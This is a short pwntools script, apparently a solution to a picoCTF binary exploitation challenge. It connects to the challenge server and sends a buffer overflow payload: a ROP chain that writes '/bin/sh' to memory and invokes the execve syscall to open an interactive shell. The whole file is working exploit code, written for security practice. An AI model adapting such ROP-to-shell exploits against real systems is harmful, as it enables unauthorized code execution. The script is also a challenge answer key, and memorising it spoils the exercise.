from pwn import *


r = remote("jupiter.challenges.picoctf.org", 42953)

#Generate payload
pad = b'a'*120
str_addrr = p64(0x00000000006ba0e0)
shell = p64(0x68732F6E69622F)
pop_rsi = p64(0x410ca3)
pop_rax = p64(0x4163f4)
mov_rsi_rax = p64(0x47ff91)
syscall = p64(0x40137c)
pop_rdi = p64(0x400696)
pop_rsi = p64(0x410ca3)
pop_rdx = p64(0x44a6b5)
payload = pad + pop_rax + shell + pop_rsi + str_addrr + mov_rsi_rax + pop_rdi + str_addrr + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + pop_rax + p64(0x3B) + syscall


r.recv()
r.sendline(b"84")
r.recv()
r.sendline(payload)

r.interactive()
